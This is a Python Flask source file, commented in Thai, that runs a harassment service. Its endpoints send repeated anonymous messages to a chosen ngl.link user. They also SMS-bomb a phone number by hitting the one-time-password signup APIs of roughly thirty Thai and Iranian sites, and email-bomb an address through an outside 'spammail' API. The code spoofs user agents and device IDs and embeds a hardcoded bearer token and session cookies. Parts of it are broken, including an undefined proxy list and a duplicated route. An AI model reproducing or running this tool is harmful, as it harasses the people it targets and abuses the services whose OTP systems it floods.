from flask import Flask, request, jsonify
import requests
import threading
import time
import random
import string
from datetime import datetime, timedelta
import os 

app = Flask(__name__)
start_time = datetime.now()

# ฟังก์ชันสำหรับดึง user-agent จากไฟล์
def get_user_agent():
    agents = os.getenv("USER_AGENTS", "").splitlines()
    return random.choice(agents) if agents else "Mozilla/5.0"

# ฟังก์ชันสำหรับสร้าง device ID
def generate_device_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

@app.route('/api/ngl', methods=['GET'])
def ngl_api():
    # รับพารามิเตอร์จาก URL
    username = request.args.get('username')
    message = request.args.get('message')
    count = int(request.args.get('count', 1))  # ค่าเริ่มต้น 1 ถ้าไม่ระบุ
    delay = float(request.args.get('delay', 0))  # ค่าเริ่มต้น 0 ถ้าไม่ระบุ (หน่วยวินาที)

    # ตรวจสอบพารามิเตอร์ที่จำเป็น
    if not username or not message:
        return jsonify({"error": "username and message are required"}), 400

    # จำกัดจำนวนครั้งส่งสูงสุด
    if count > 20:
        return jsonify({"error": "Max count is 20"}), 400

    # จำกัดค่า delay สูงสุด (ไม่เกิน 10 วินาที)
    if delay > 10:
        return jsonify({"error": "Max delay is 10 seconds"}), 400

    # สร้าง thread สำหรับส่งคำขอแบบไม่บล็อกการทำงานหลัก
    threading.Thread(
        target=process_ngl_request,
        args=(username, message, count, delay)
    ).start()

    # ตอบกลับทันทีโดยไม่รอให้ส่งเสร็จ
    return jsonify({
        "username": username,
        "message": message,
        "count": count,
        "delay": delay,
        "status": "processing_started",
        "note": "Requests are being sent in the background"
    })

def process_ngl_request(username, message, count, delay):
    for i in range(count):
        try:
            # สร้าง headers และข้อมูลสำหรับคำขอ
            headers = {
                'Host': 'ngl.link',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'user-agent': get_user_agent(),
                'origin': 'https://ngl.link',
                'referer': f'https://ngl.link/{username}',
            }

            data = {
                'username': username,
                'question': message,
                'deviceId': generate_device_id(),
                'gameSlug': '',
                'referrer': '',
            }

            # ส่งคำขอ POST ไปยัง API ของ NGL
            response = requests.post(
                'https://ngl.link/api/submit',
                headers=headers,
                data=data
            )

            # แสดงสถานะการส่ง (สำหรับ debugging)
            print(f"Sent request {i+1}/{count} to {username} - Status: {response.status_code}")

            # รอตามเวลาที่กำหนด (ถ้ามี)
            if delay > 0 and i < count - 1:  # ไม่ต้องรอหลังคำขอสุดท้าย
                time.sleep(delay)

        except requests.exceptions.RequestException as e:
            print(f"Error sending request {i+1}: {str(e)}")
            continue


@app.route('/api/sms', methods=['GET'])
def send_sms():
    phone = request.args.get('phone')
    count = request.args.get('count')

    if not phone or not count:
        return jsonify({"error": "Missing 'phone' or 'count' parameter"}), 400

    try:
        count = int(count)
    except ValueError:
        return jsonify({"error": "'count' must be an integer"}), 400

    max_count = 10
    if count > max_count:
        return jsonify({"error": f"Max count {max_count}"}), 400

    for _ in range(count):
        threading.Thread(target=send_sms_request, args=(phone,)).start()
        time.sleep(0.1)

    return jsonify({
        "phone": phone,
        "count": count,
        "status": "success"
    })

def send_sms_request(phone):
    session = requests.Session()
    useragent = get_user_agent()

    def ax1():
        try:
            r = session.post("https://pgslotfish.fgdesl.com/api/otp?lang=th", data={"phone_number": phone, "register_type": "", "type_otp": "register"}, headers={"User-Agent": useragent})
        except requests.exceptions.RequestException:
            pass

    def ax2():
        try:
            r = session.post("https://fullslotpg.fufuslg.com/api/otp", data={"telefon_number": phone, "registrera_typ": ""}, headers={"User-Agent": useragent})
        except requests.exceptions.RequestException:
            pass

    def gaming():
        try:
            r = session.get(f"https://www.168gaming.net/api/v1/public/members/request/otp/register/{phone}")
        except requests.exceptions.RequestException:
            pass

    def cyber():
        try:
            r = requests.get(f"https://api.cyber-safe.cloud/api/spamsms/cbacb14dc5/{phone}/1")
        except requests.exceptions.RequestException:
            pass
            
    def nocnocx1():
        try:
            head = {
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwcnpjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "*/*",
            "referer": "https://nocnoc.com/login",
            "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
            }
            r = session.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}})
        except:pass

    def nocnocx2():
        try:
            r = session.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
            r = session.post("https://www.carsome.co.th/website/login/sendSMS", json={"username":phone,"optType":0})
        except:pass

    def lotuss():
        try:
            r = session.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
        except requests.exceptions.RequestException:
            pass

    def delivery():
        try:
            r = session.post("https://api.1112delivery.com/api/v1/otp/create",headers={"User-Agent": useragent},json={'phonenumber': f"{phone}", 'language': "th"})
        except requests.exceptions.RequestException:
            pass

    def redbus():
        try:
           r = requests.get(
            "https://m.redbus.id/api/getOtp?number=" + phone[1:] + "&cc=66&whatsAppOpted=true",
            headers={
                "traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
            }
            ).text
        except requests.exceptions.RequestException:
            pass

    def truewallet():
        url = "https://pygw.csne.co.th/api/gateway/truewalletRequestOtp"
        data = {
         "transactionId": "b05a66a7e9d0930cbda4d78b351ea6f7",
         "phone": phone
        }
        headers = {
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "User-Agent": useragent,
         "Cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"
        }

        try:
           r = session.post(url, data=data, headers=headers)
           if r.status_code != 200:
            pass  # Handle failure silently if needed
        except requests.exceptions.RequestException:
            pass  # Handle exception silently if needed

    def ch3plus():
        try:
            # ข้อมูลที่ใช้สำหรับการขอ OTP
            url = "https://api-sso.ch3plus.com/user/request-otp"
            data = {
                "tel": phone,
                "type": "login"
            }
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
            }
            response = requests.post(url, json=data, headers=headers)
            if response.status_code != 200:
                pass  # Handle failure silently if needed
        except requests.exceptions.RequestException:
            pass  # Handle exception silently if needed

    def firster():
        try:
            r = session.post(f"https://graph.firster.com/graphql",headers={"User-Agent": useragent}, json={"operationName": "sendOtp","variables": {"input": {"mobileNumber": phone[1:],"phoneCode": "THA-66"}},"query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})
        except requests.exceptions.RequestException:
            pass

    def firster1():
        try:
            headers={
            "organizationcode": "lifestyle",
            "content-type": "application/json"
            }
            json = {"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone,"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"}
            r = session.post("https://graph.firster.com/graphql",headers=headers ,json=json)
        except requests.exceptions.RequestException:
            pass

    def snapp_taxi():
        try:
            url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
            data = {"cellphone": f"+66{phone[1:]}"}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def gap():
        try:
            url = f"https://core.gap.im/v1/user/add.json?mobile=+66{phone[1:]}"
            headers = {
                "Host": "core.gap.im",
                "accept": "application/json, text/plain, */*",
                "x-version": "4.5.7",
                "accept-language": "fa",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
                "appversion": "web",
                "origin": "https://web.gap.im",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://web.gap.im/",
                "accept-encoding": "gzip, deflate, br"
            }
            r = session.get(url, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def tapsi():
        try:
            url = "https://api.tapsi.cab/api/v2.2/user"
            data = {"credential": {"phoneNumber": f"0{phone[1:]}", "role": "PASSENGER"}, "otpOption": "SMS"}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def zarinplus():
        try:
            url = "https://api.zarinplus.com/user/zarinpal-login"
            data = {"phone_number": f"66{phone[1:]}"}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def divar():
        try:
            url = "https://api.divar.ir/v5/auth/authenticate"
            data = {"phone": f"+66{phone[1:]}"}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def torob():
        try:
            url = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{phone[1:]}"
            headers = {"User-Agent": useragent}
            r = session.get(url, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def sheypoor():
        try:
            url = "https://www.sheypoor.com/api/v10.0.0/auth/send"
            data = {"username": f"0{phone[1:]}"}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def digikala():
        try:
            url = "https://api.digikala.com/v1/user/authenticate/"
            data = {"backUrl": "/", "username": f"0{phone[1:]}", "otp_call": False}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def cafebazaar():
        try:
            url = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
            data = {
                "properties": {
                    "language": 1,
                    "clientID": "z0vac07sqjbfm5nh2cilmr4bgksq4rl8",
                    "deviceID": "z0vac07sqjbfm5nh2cilmr4bgksq4rl8",
                    "clientVersion": "web"
                },
                "singleRequest": {
                    "getOtpTokenRequest": {
                        "username": f"66{phone[1:]}"
                    }
                }
            }
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def tetherland():
        try:
            url = "https://data.tetherland.com/api/v4/user/login"
            data = {"mobile": f"0{phone[1:]}"}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def safarmarket():
        try:
            url = f"https://safarmarket.com/api/security/v1/user/is_phone_available?phone=0{phone[1:]}"
            headers = {"User-Agent": useragent}
            r = session.get(url, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def ghasedak24():
        try:
            url = "https://ghasedak24.com/user/ajax_register"
            data = f"username=0{phone[1:]}"
            headers = {
                "authority": "ghasedak24.com",
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://ghasedak24.com",
                "referer": "https://ghasedak24.com/user/login",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
                "x-requested-with": "XMLHttpRequest"
            }
            r = session.post(url, data=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def alibaba_ir():
        try:
            url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
            data = {"phoneNumber": f"+66{phone[1:]}"}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def flightio():
        try:
            url = "https://flightio.com/bff/Authentication/CheckUserKey"
            data = {"userKey": f"66-{phone[1:]}", "userKeyType": 1}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass

    def trip_ir():
        try:
            url = "https://gateway.trip.ir/api/registers"
            data = {"CellPhone": f"0{phone[1:]}"}
            headers = {"User-Agent": useragent}
            r = session.post(url, json=data, headers=headers)
        except requests.exceptions.RequestException:
            pass
    def giztix():
        try:
            url = "https://api.giztix.com/graphql"
            data = {
                "operationName": "OtpGeneratePhone",
                "variables": {"phone": f"66{phone[1:]}"},
                "query": """mutation OtpGeneratePhone($phone: ID!) {
                    otpGeneratePhone(phone: $phone) {
                        ref
                        __typename
                    }
                }"""
            }
            headers = {
                "User-Agent": useragent,
                "Content-Type": "application/json"
            }
            proxies = {
                "http": "http://" + random.choice(s),
                "https": "http://" + random.choice(s)
            }

            r = session.post(url, json=data, headers=headers, proxies=proxies)

        except requests.exceptions.RequestException:
            pass

    
    
    # เรียกใช้งานทั้งสองฟังก์ชันในทุกๆ รอบ
    ax1()
    ax2()
    gaming()
    cyber()
    nocnocx1()
    nocnocx2()
    lotuss()
    delivery()
    redbus()
    truewallet()
    ch3plus()
    firster()
    firster1()
    snapp_taxi()
    gap()
    tapsi()
    zarinplus()
    divar()
    torob()
    sheypoor()
    digikala()
    cafebazaar()
    tetherland()
    safarmarket()
    ghasedak24()
    alibaba_ir()
    flightio()
    trip_ir()
    giztix()

@app.route('/api/mail', methods=['GET'])
def send_email():
    mail = request.args.get('mail')
    count = request.args.get('count')

    if not mail or not count:
        return jsonify({"error": "Missing 'mail' or 'count' parameter"}), 400

    try:
        count = int(count)
    except ValueError:
        return jsonify({"error": "'count' must be an integer"}), 400

    max_count = 10
    if count > max_count:
        return jsonify({"error": f"Max count {max_count}"}), 400

    for _ in range(count):
        threading.Thread(target=send_email_request, args=(mail,)).start()
        time.sleep(0.1)

    return jsonify({
        "mail": mail,
        "count": count,
        "status": "success"
    })

def send_email_request(mail):
    try:
        requests.get(f"https://api.cyber-safe.cloud/api/spammail/cbacb14dc5/{mail}/1")
    except requests.exceptions.RequestException:
        pass

@app.route('/api/status', methods=['GET'])
def status():
    uptime = datetime.now() - start_time
    uptime_str = str(timedelta(seconds=int(uptime.total_seconds())))
    return jsonify({"uptime": uptime_str})

@app.route('/', methods=['GET'])
def main():
    return jsonify({"docs": "cyhy-edge.pro"})


from flask_cors import CORS

# Enable CORS (if not already enabled)
try:
    CORS(app)
except:
    pass

@app.route("/api/sms", methods=["GET"])
def discord_sms():
    phone = request.args.get("phone")
    count = request.args.get("count", type=int)

    if not phone or not count:
        return jsonify({"error": "ต้องใส่ phone และ count"}), 400

    # Call existing SMS sending logic
    for i in range(count):
        print(f"ส่ง SMS ไป {phone} ({i+1}/{count})")
        # Example: send_sms(phone)

    return jsonify({"message": f"ส่ง SMS ไปที่ {phone} จำนวน {count} ครั้งสำเร็จ"})

if __name__ == '__main__':

    app.run(debug=True, host='0.0.0.0', port=5000)
